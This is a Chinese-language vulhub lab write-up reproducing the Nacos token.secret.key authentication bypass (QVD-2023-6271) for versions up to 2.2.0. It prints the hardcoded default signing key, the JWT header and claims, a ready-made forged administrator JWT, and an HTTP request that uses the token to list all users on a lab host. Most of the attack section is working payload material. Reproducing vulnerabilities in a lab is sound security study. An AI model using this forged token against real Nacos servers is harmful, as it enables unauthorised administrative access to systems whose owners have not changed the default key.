---
title: "Nacos token.secret.key 身份认证绕过漏洞"
date: 2026-10-27 00:00:00
tags:
  - Nacos
  - JWT
  - 认证绕过
  - QVD-2023-6271
  - 漏洞复现
categories:
  - [vulhub靶场, nacos]
---

# Nacos token.secret.key 身份认证绕过漏洞（QVD-2023-6271）

**本质**：Nacos 签名 token 用的密钥 `token.secret.key` 是**写死的默认值**，攻击者拿这个公开密钥**伪造管理员 JWT** 直接进后台。

**影响版本**：0.1.0 ≤ Nacos ≤ 2.2.0（2.2.0.1 修复）

这次泄露的key主要是审计源码，发现nacos的key是默认写死的key

```
SecretKey012345678901234567890123456789012345678901234567890123456789
```

拿到key，就可以去伪造jwt

# Payload

### 伪造管理员JWT Token

访问jwt.io网站去伪造jwt

**Header**

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**payload**

```
{
  "sub": "nacos",
  "exp": 1900000000
}
```

**Sign JWT（密钥）**

```
SecretKey012345678901234567890123456789012345678901234567890123456789
```

**JWT**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTkwMDAwMDAwMH0.6f5QYPckxDMe3aUSk5wdBsJLrDXczhQhxeYodKmirOA
```

这里要注意的点是exp

exp的全程是expiration（过期时间）

而1900000000是**Unix 时间戳**，代表的意思是从1970 年 1 月 1 日 0 点（UTC）算起，过了 1900000000 秒

也就是大约 **2030 年 3 月**这个jwt过期

这个起点时间是Unix 系统规定的。

![image-20261021111812493](/img/nacos/image-20261021111812493.png)

用伪造的JWT去登录操作即可

**例如列出所有用户poc**

```
GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=<JWT的token> HTTP/1.1
Host: 192.168.162.128:8848
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Connection: close

```
